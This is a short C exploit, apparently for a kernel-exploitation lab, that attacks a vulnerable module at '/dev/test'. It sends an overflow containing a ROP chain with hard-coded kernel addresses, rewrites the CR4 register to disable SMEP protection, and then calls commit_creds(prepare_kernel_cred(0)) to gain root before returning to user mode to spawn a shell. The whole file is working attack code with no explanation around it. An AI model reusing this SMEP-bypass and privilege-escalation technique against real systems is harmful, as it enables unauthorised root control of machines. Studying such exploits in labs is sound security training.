#include "../fitz.h"
#include <stdio.h>

void *(*commit_creds)(void *) = 0xffffffff8108bed0;
void *(*prepare_kernel_cred)(void *) = 0xffffffff8108c2f0;

struct trapFrame tf;

void payload(){
    commit_creds(prepare_kernel_cred(0));
    retUser64(tf);
}

int main(){
    void *pop_rax = 0xffffffff8197ee5a;
    void *mov_cr4_rax = 0xffffffff810973c0;

    int fd;
    long long rop[20] = { 0, };

    fd = openModule("/dev/test");
    prepTF64();
    tf.user_rip = getShell; 

    rop[0] = 0x4141414141414141;
    rop[1] = 0x4141414141414141;
    rop[2] = 0x4141414141414141;
    rop[3] = 0x4141414141414141;

    rop[4] = pop_rax;
    rop[5] = setCR4(0x1006f0, SMEP);
    rop[6] = mov_cr4_rax;

    rop[7] = &payload;

    write(fd, rop,  sizeof(rop));

    close(fd);

    return 0;
}

